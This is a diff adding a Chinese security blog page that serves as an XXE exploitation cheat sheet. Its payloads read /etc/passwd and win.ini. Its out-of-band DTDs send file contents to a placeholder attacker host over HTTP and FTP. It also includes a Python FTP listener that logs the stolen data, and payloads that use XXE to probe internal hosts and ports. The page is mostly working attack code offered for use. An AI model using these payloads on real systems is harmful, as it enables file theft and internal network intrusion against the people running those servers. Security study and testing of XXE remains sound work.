@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>XXE利用 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="有回显XXE 引用外部实体 1 2 3 4 5 6 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34; ?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt; &amp;lt;!ENTITY s1 SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;s1;&amp;lt;/foo&amp;gt; 引用公共实体 1 2 3 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34; ?&amp;gt; &amp;lt;!DOCTYPE root PUBLIC &amp;#34;test&amp;#34; &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt; 引用参数实体 当文件含有特殊符号" /><meta name="keywords" content="SSM, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.57.2 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/security/xxe%E5%88%A9%E7%94%A8/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="XXE利用" />
+<meta property="og:description" content="有回显XXE 引用外部实体 1 2 3 4 5 6 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY s1 SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt; &lt;foo&gt;&amp;s1;&lt;/foo&gt; 引用公共实体 1 2 3 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE root PUBLIC &#34;test&#34; &#34;file:///etc/passwd&#34;&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 引用参数实体 当文件含有特殊符号" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/security/xxe%E5%88%A9%E7%94%A8/" />
+<meta property="article:published_time" content="2021-01-17T12:28:36+08:00" />
+<meta property="article:modified_time" content="2021-01-17T12:28:36+08:00" />
+<meta itemprop="name" content="XXE利用">
+<meta itemprop="description" content="有回显XXE 引用外部实体 1 2 3 4 5 6 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY s1 SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt; &lt;foo&gt;&amp;s1;&lt;/foo&gt; 引用公共实体 1 2 3 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE root PUBLIC &#34;test&#34; &#34;file:///etc/passwd&#34;&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 引用参数实体 当文件含有特殊符号">
+
+
+<meta itemprop="datePublished" content="2021-01-17T12:28:36&#43;08:00" />
+<meta itemprop="dateModified" content="2021-01-17T12:28:36&#43;08:00" />
+<meta itemprop="wordCount" content="735">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XXE利用"/>
+<meta name="twitter:description" content="有回显XXE 引用外部实体 1 2 3 4 5 6 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY s1 SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt; &lt;foo&gt;&amp;s1;&lt;/foo&gt; 引用公共实体 1 2 3 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt; &lt;!DOCTYPE root PUBLIC &#34;test&#34; &#34;file:///etc/passwd&#34;&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 引用参数实体 当文件含有特殊符号"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">XXE利用</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-01-17 </span>
+        <div class="post-category">
+            <a href="/categories/security/"> security </a>
+            </div>
+          <span class="more-meta"> 约 735 字 </span>
+          <span class="more-meta"> 预计阅读 2 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#有回显xxe">有回显XXE</a>
+<ul>
+<li><a href="#引用外部实体">引用外部实体</a></li>
+<li><a href="#引用公共实体">引用公共实体</a></li>
+<li><a href="#引用参数实体">引用参数实体</a></li>
+</ul></li>
+<li><a href="#无回显xxe">无回显XXE</a>
+<ul>
+<li><a href="#php环境下">php环境下</a></li>
+<li><a href="#java环境下">Java环境下</a></li>
+</ul></li>
+<li><a href="#xxe内网主机和端口探测">XXE内网主机和端口探测</a>
+<ul>
+<li><a href="#内网主机探测">内网主机探测</a></li>
+<li><a href="#内网端口探测">内网端口探测</a></li>
+</ul></li>
+<li><a href="#一些其他利用方式">一些其他利用方式</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h2 id="有回显xxe">有回显XXE</h2>
+
+<h3 id="引用外部实体">引用外部实体</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY s1 SYSTEM &#34;file:///etc/passwd&#34; &gt;
+]&gt;
+&lt;foo&gt;&amp;s1;&lt;/foo&gt;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="引用公共实体">引用公共实体</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt;
+&lt;!DOCTYPE root PUBLIC &#34;test&#34; &#34;file:///etc/passwd&#34;&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="引用参数实体">引用参数实体</h3>
+
+<p>当文件含有特殊符号的时候，如&amp;,&lt;,&gt;,&ldquo;,&lsquo;等。使用此种方式：</p>
+
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &#34;&lt;![CDATA[&#34;&gt;   
+&lt;!ENTITY % goodies SYSTEM &#34;file:///etc/passwd&#34;&gt;  
+&lt;!ENTITY % end &#34;]]&gt;&#34;&gt;  
+&lt;!ENTITY % dtd SYSTEM &#34;http://ip/evil.dtd&#34;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</pre></td></tr></table>
+</div>
+</div>
+<p>evil.dtd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; 
+&lt;!ENTITY all &#34;%start;%goodies;%end;&#34;&gt;</pre></td></tr></table>
+</div>
+</div>
+<h2 id="无回显xxe">无回显XXE</h2>
+
+<h3 id="php环境下">php环境下</h3>
+
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &#34;http://ip/evil.dtd&#34;&gt;
+%remote;%int;%send;
+]&gt;</pre></td></tr></table>
+</div>
+</div>
+<p>evil.dtd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///windows/win.ini&#34;&gt;
+&lt;!ENTITY % int &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&#34;&gt;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="java环境下">Java环境下</h3>
+
+<p>JDK必须小于7u141或者小于8u162才可以读取没有特殊符号的文件(例如换行符号等)。</p>
+
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE cdl [&lt;!ENTITY % asd SYSTEM &#34;http://ip:8000/evil.dtd&#34;&gt;%asd;%c;]&gt;
+&lt;cdl&gt;&amp;rrr;&lt;/cdl&gt;</pre></td></tr></table>
+</div>
+</div>
+<p>evil.dtd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;!ENTITY % d SYSTEM &#34;file:///C://windows/win.ini&#34;&gt;
+&lt;!ENTITY % c &#34;&lt;!ENTITY rrr SYSTEM &#39;ftp://ip:2144/%d;&#39;&gt;&#34;&gt;</pre></td></tr></table>
+</div>
+</div>
+<p>开启FTP服务器的脚本如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">#!/usr/bin/env python3
+import socket
+import sys
+import argparse
+
+
+name = &#34;&#34;&#34;
+Running...
+&#34;&#34;&#34;
+
+print(name)
+
+parser = argparse.ArgumentParser(description=&#39;An Out-of-Band XXE tool&#39;)
+parser.add_argument(&#39;port&#39;,type=int,help=&#34;Port for the FTP server to listen on (2121 / 21)&#34;)
+args = parser.parse_args()
+
+HOST = &#39;&#39;
+PORT = args.port
+
+welcome = b&#39;oob-xxe\n&#39;
+ftp_catch_all_response = b&#39;more data please!\n&#39;
+ftp_user_response = b&#39;hello world!\n&#39;
+ftp_pass_response = b&#39;my password is also hunter2!\n&#39;
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def main():
+    try:
+        s.bind((HOST, PORT))
+    except socket.error as msg:
+        print(&#39;[+] ERROR: Bind failed. &#39;)
+        sys.exit()
+
+    s.listen(10)
+    print(&#39;[+] OOB started on port: &#39;+str(PORT))
+
+
+    conn, addr = s.accept()
+    print(&#39;[*] Connection from: &#39;+addr[0])
+    conn.sendall(welcome)
+
+    while True:
+        data = conn.recv(1024)
+        ftp_command = data.split(b&#34; &#34;, 1)
+        response = {
+            &#39;user&#39;: ftp_user_response,
+            &#39;pass&#39;: ftp_pass_response,
+        }.get(ftp_command[0].lower(), ftp_catch_all_response)
+        conn.sendall(response)
+        line = data.decode(&#39;UTF-8&#39;)
+        line = line.replace(&#34;\n&#34;,&#34;&#34;).replace(&#34;CWD&#34;,&#34;&#34;)
+        print(line)
+        extract(line)
+    s.close()
+
+def extract(data):
+        fopen = open(&#39;./extracted.log&#39;, &#39;a&#39;)
+        fopen.write(data)
+        fopen.close()
+
+try:
+    main()
+except KeyboardInterrupt:
+    s.close()</pre></td></tr></table>
+</div>
+</div>
+<h2 id="xxe内网主机和端口探测">XXE内网主机和端口探测</h2>
+
+<h3 id="内网主机探测">内网主机探测</h3>
+
+<p>payload如下(使用burp的intruder修改ip)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY s1 SYSTEM &#34;http://10.0.0.1&#34; &gt;
+]&gt;
+&lt;foo&gt;&amp;s1;&lt;/foo&gt;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="内网端口探测">内网端口探测</h3>
+
+<p>payload如下（使用burp的intruder修改端口）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;  
+&lt;!DOCTYPE data SYSTEM &#34;http://127.0.0.1:515/&#34; [  
+&lt;!ELEMENT data (#PCDATA)&gt;  
+]&gt;
+&lt;data&gt;4&lt;/data&gt;</pre></td></tr></table>
+</div>
+</div>
+<h2 id="一些其他利用方式">一些其他利用方式</h2>
+
+<ul>
+<li><code>jar://</code> 协议文件上传。</li>
+<li>Dos攻击。</li>
+<li>邮件钓鱼：如果内网有一台易受攻击的SMTP服务器，我们就能利用 <code>ftp://</code> 协议结合 <code>CRLF</code> 注入向其发送任意命令。</li>
+</ul>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+<li><a href="l0">一篇文章带你深入理解XXE</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-01-17
+        
+    </span>
+  </p>
+  
+  
+</div>
+<div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/pay/wechat.jpg">
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/pay/alipay.jpg">
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div><footer class="post-footer">
+      
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/code_audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/">
+            <span class="next-text nav-default">代码审计思路</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">P1n93r</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
